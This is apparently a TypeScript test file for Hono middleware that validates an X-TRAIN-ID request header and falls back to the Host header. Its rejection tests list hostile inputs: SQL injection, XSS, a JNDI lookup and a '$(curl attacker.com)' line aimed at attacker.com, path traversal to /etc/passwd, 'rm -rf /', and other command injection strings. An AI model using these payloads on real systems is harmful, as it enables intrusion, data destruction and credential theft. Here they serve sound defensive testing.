import { describe, it, expect, beforeEach, afterEach } from 'bun:test'
import { Hono } from 'hono'
import { trainIdExtractor } from '../src/middleware/train-id-extractor'

describe('Train ID Extractor Middleware', () => {
  let app: Hono
  let originalEnv: string | undefined

  beforeEach(() => {
    // Save original environment variable
    originalEnv = process.env.ENABLE_HOST_HEADER_FALLBACK

    app = new Hono()
    app.use('*', trainIdExtractor)

    // Test endpoint that returns the extracted train ID and source
    app.get('/test', c => {
      const trainId = c.get('trainId')
      const trainIdSource = c.get('trainIdSource')
      return c.json({ trainId, trainIdSource })
    })
  })

  afterEach(() => {
    // Restore original environment variable
    if (originalEnv !== undefined) {
      process.env.ENABLE_HOST_HEADER_FALLBACK = originalEnv
    } else {
      delete process.env.ENABLE_HOST_HEADER_FALLBACK
    }
  })

  describe('Valid train IDs', () => {
    it('should accept alphanumeric characters', async () => {
      const res = await app.request('/test', {
        headers: {
          'X-TRAIN-ID': 'abc123',
        },
      })

      expect(res.status).toBe(200)
      const body = await res.json()
      expect(body.trainId).toBe('abc123')
      expect(body.trainIdSource).toBe('header')
    })

    it('should accept uppercase and lowercase letters', async () => {
      const res = await app.request('/test', {
        headers: {
          'X-TRAIN-ID': 'MyTrainId123',
        },
      })

      expect(res.status).toBe(200)
      const body = await res.json()
      expect(body.trainId).toBe('MyTrainId123')
    })

    it('should accept underscores', async () => {
      const res = await app.request('/test', {
        headers: {
          'X-TRAIN-ID': 'train_id_123',
        },
      })

      expect(res.status).toBe(200)
      const body = await res.json()
      expect(body.trainId).toBe('train_id_123')
    })

    it('should accept hyphens', async () => {
      const res = await app.request('/test', {
        headers: {
          'X-TRAIN-ID': 'train-id-123',
        },
      })

      expect(res.status).toBe(200)
      const body = await res.json()
      expect(body.trainId).toBe('train-id-123')
    })

    it('should accept mix of valid characters', async () => {
      const res = await app.request('/test', {
        headers: {
          'X-TRAIN-ID': 'Train_ID-123_test',
        },
      })

      expect(res.status).toBe(200)
      const body = await res.json()
      expect(body.trainId).toBe('Train_ID-123_test')
    })

    it('should accept single character', async () => {
      const res = await app.request('/test', {
        headers: {
          'X-TRAIN-ID': 'a',
        },
      })

      expect(res.status).toBe(200)
      const body = await res.json()
      expect(body.trainId).toBe('a')
    })

    it('should accept 255 character train ID', async () => {
      const longTrainId = 'a'.repeat(255)
      const res = await app.request('/test', {
        headers: {
          'X-TRAIN-ID': longTrainId,
        },
      })

      expect(res.status).toBe(200)
      const body = await res.json()
      expect(body.trainId).toBe(longTrainId)
    })
  })

  describe('Invalid train IDs', () => {
    it('should reject empty string', async () => {
      const res = await app.request('/test', {
        headers: {
          'X-TRAIN-ID': '',
        },
      })

      expect(res.status).toBe(400)
      const body = await res.json()
      expect(body.error).toBe('Invalid train-id header')
      expect(body.message).toBe(
        'Train ID must contain only alphanumeric characters, underscores, and hyphens (1-255 chars)'
      )
    })

    it('should reject train ID longer than 255 characters', async () => {
      const tooLongTrainId = 'a'.repeat(256)
      const res = await app.request('/test', {
        headers: {
          'X-TRAIN-ID': tooLongTrainId,
        },
      })

      expect(res.status).toBe(400)
      const body = await res.json()
      expect(body.error).toBe('Invalid train-id header')
    })

    it('should reject special characters', async () => {
      const invalidIds = [
        'train@id',
        'train.id',
        'train+id',
        'train id', // space
        'train/id',
        'train\\id',
        'train#id',
        'train$id',
        'train%id',
        'train&id',
        'train*id',
        'train!id',
        'train?id',
        'train=id',
        'train[id]',
        'train{id}',
        'train|id',
        'train:id',
        'train;id',
        "train'id",
        'train"id',
        'train<id>',
        'train,id',
      ]

      for (const invalidId of invalidIds) {
        const res = await app.request('/test', {
          headers: {
            'X-TRAIN-ID': invalidId,
          },
        })

        expect(res.status).toBe(400)
        const body = await res.json()
        expect(body.error).toBe('Invalid train-id header')
        expect(body.message).toBe(
          'Train ID must contain only alphanumeric characters, underscores, and hyphens (1-255 chars)'
        )
      }
    })

    it('should reject Unicode characters', async () => {
      const unicodeIds = [
        'café',
        'résumé',
        'naïve',
        // Note: Some Unicode characters like emojis cause HTTP header validation errors
        // so we test ones that would pass header validation but fail our regex
      ]

      for (const unicodeId of unicodeIds) {
        const res = await app.request('/test', {
          headers: {
            'X-TRAIN-ID': unicodeId,
          },
        })

        expect(res.status).toBe(400)
        const body = await res.json()
        expect(body.error).toBe('Invalid train-id header')
      }
    })

    it('should reject potential injection attempts', async () => {
      const injectionAttempts = [
        '; DROP TABLE users;--',
        "'; DROP TABLE users;--",
        '<script>alert("xss")</script>',
        '${jndi:ldap://attacker.com/a}',
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '`rm -rf /`',
        '$(curl attacker.com)',
        '{{7*7}}',
        '<%=7*7%>',
        '#{7*7}',
        'javascript:alert(1)',
      ]

      for (const attempt of injectionAttempts) {
        const res = await app.request('/test', {
          headers: {
            'X-TRAIN-ID': attempt,
          },
        })

        expect(res.status).toBe(400)
        const body = await res.json()
        expect(body.error).toBe('Invalid train-id header')
      }
    })
  })

  describe('Default behavior', () => {
    it('should use default train ID when header is missing', async () => {
      const res = await app.request('/test', {
        headers: {},
      })

      expect(res.status).toBe(200)
      const body = await res.json()
      expect(body.trainId).toBe('default')
    })

    it('should validate default train ID (should be valid)', async () => {
      // This test ensures the default value is valid
      const res = await app.request('/test', {
        headers: {},
      })

      expect(res.status).toBe(200)
      const body = await res.json()
      expect(body.trainId).toBe('default')
    })
  })

  describe('Edge cases', () => {
    it('should handle undefined header value', async () => {
      const res = await app.request('/test')

      expect(res.status).toBe(200)
      const body = await res.json()
      expect(body.trainId).toBe('default')
    })

    it('should handle multiple occurrences of same header (should use first)', async () => {
      // Note: This behavior depends on how Hono handles multiple headers
      // This test documents the expected behavior
      const res = await app.request('/test', {
        headers: {
          'X-TRAIN-ID': 'valid123',
        },
      })

      expect(res.status).toBe(200)
      const body = await res.json()
      expect(body.trainId).toBe('valid123')
    })
  })

  describe('Security considerations', () => {
    it('should prevent SQL injection patterns', async () => {
      const sqlInjectionPatterns = [
        "1' OR '1'='1",
        "'; SELECT * FROM users WHERE ''='",
        '1; DELETE FROM users;--',
        'UNION SELECT password FROM users--',
      ]

      for (const pattern of sqlInjectionPatterns) {
        const res = await app.request('/test', {
          headers: {
            'X-TRAIN-ID': pattern,
          },
        })

        expect(res.status).toBe(400)
        const body = await res.json()
        expect(body.error).toBe('Invalid train-id header')
      }
    })

    it('should prevent path traversal patterns', async () => {
      const pathTraversalPatterns = [
        '../config',
        '../../secrets',
        '..\\..\\config',
        '%2e%2e%2fconfig',
        '%2e%2e%5cconfig',
      ]

      for (const pattern of pathTraversalPatterns) {
        const res = await app.request('/test', {
          headers: {
            'X-TRAIN-ID': pattern,
          },
        })

        expect(res.status).toBe(400)
        const body = await res.json()
        expect(body.error).toBe('Invalid train-id header')
      }
    })

    it('should prevent command injection patterns', async () => {
      const commandInjectionPatterns = [
        '; ls -la',
        '| cat /etc/passwd',
        '`id`',
        '$(whoami)',
        '&& rm -rf /',
      ]

      for (const pattern of commandInjectionPatterns) {
        const res = await app.request('/test', {
          headers: {
            'X-TRAIN-ID': pattern,
          },
        })

        expect(res.status).toBe(400)
        const body = await res.json()
        expect(body.error).toBe('Invalid train-id header')
      }
    })
  })

  describe('Backward Compatibility (Host Header Fallback)', () => {
    beforeEach(() => {
      // Enable host header fallback for these tests
      process.env.ENABLE_HOST_HEADER_FALLBACK = 'true'
    })

    it('should use X-TRAIN-ID header when both X-TRAIN-ID and Host are present', async () => {
      const res = await app.request('/test', {
        headers: {
          'X-TRAIN-ID': 'preferred-train-id',
          Host: 'api.example.com',
        },
      })

      expect(res.status).toBe(200)
      const body = await res.json()
      expect(body.trainId).toBe('preferred-train-id')
      expect(body.trainIdSource).toBe('header')
      expect(res.headers.get('X-Train-ID-Source')).toBeNull()
    })

    it('should fallback to Host header when X-TRAIN-ID is missing', async () => {
      // Mock console.warn to capture the warning
      const originalWarn = console.warn
      let warnMessage = ''
      console.warn = (message: string) => {
        warnMessage = message
      }

      const res = await app.request('/test', {
        headers: {
          Host: 'api.example.com',
        },
      })

      expect(res.status).toBe(200)
      const body = await res.json()
      expect(body.trainId).toBe('api-example-com')
      expect(body.trainIdSource).toBe('host-fallback')
      expect(res.headers.get('X-Train-ID-Source')).toBe('host-fallback-deprecated')
      expect(res.headers.get('X-Migration-Notice')).toBe('Please migrate to X-TRAIN-ID header')
      expect(warnMessage).toBe(
        '[DEPRECATED] Using Host header fallback for train-id: api.example.com → api-example-com. Please migrate to X-TRAIN-ID header.'
      )

      // Restore original console.warn
      console.warn = originalWarn
    })

    it('should handle localhost with port in Host header', async () => {
      const res = await app.request('/test', {
        headers: {
          Host: 'localhost:3000',
        },
      })

      expect(res.status).toBe(200)
      const body = await res.json()
      expect(body.trainId).toBe('localhost-3000')
      expect(body.trainIdSource).toBe('host-fallback')
    })

    it('should handle complex domain in Host header', async () => {
      const res = await app.request('/test', {
        headers: {
          Host: 'staging.api.example.com',
        },
      })

      expect(res.status).toBe(200)
      const body = await res.json()
      expect(body.trainId).toBe('staging-api-example-com')
      expect(body.trainIdSource).toBe('host-fallback')
    })

    it('should use default when Host header is missing and X-TRAIN-ID is missing', async () => {
      const res = await app.request('/test', {
        headers: {},
      })

      expect(res.status).toBe(200)
      const body = await res.json()
      expect(body.trainId).toBe('default')
      expect(body.trainIdSource).toBe('default')
    })

    it('should reject invalid Host header-derived train-id', async () => {
      const res = await app.request('/test', {
        headers: {
          Host: 'invalid@domain.com',
        },
      })

      expect(res.status).toBe(400)
      const body = await res.json()
      expect(body.error).toBe('Invalid train-id')
      expect(body.source).toBe('host-fallback')
      expect(body.migration_note).toContain('Please migrate to using the X-TRAIN-ID header')
    })

    it('should prefer empty X-TRAIN-ID over Host header fallback', async () => {
      const res = await app.request('/test', {
        headers: {
          'X-TRAIN-ID': '',
          Host: 'api.example.com',
        },
      })

      expect(res.status).toBe(200)
      const body = await res.json()
      expect(body.trainId).toBe('api-example-com')
      expect(body.trainIdSource).toBe('host-fallback')
    })
  })

  describe('Without Host Header Fallback', () => {
    beforeEach(() => {
      // Disable host header fallback (default behavior)
      process.env.ENABLE_HOST_HEADER_FALLBACK = 'false'
    })

    it('should use default when X-TRAIN-ID is missing even if Host header is present', async () => {
      const res = await app.request('/test', {
        headers: {
          Host: 'api.example.com',
        },
      })

      expect(res.status).toBe(200)
      const body = await res.json()
      expect(body.trainId).toBe('default')
      expect(body.trainIdSource).toBe('default')
    })

    it('should not add backward compatibility headers', async () => {
      const res = await app.request('/test', {
        headers: {
          Host: 'api.example.com',
        },
      })

      expect(res.status).toBe(200)
      expect(res.headers.get('X-Train-ID-Source')).toBeNull()
      expect(res.headers.get('X-Migration-Notice')).toBeNull()
    })
  })
})
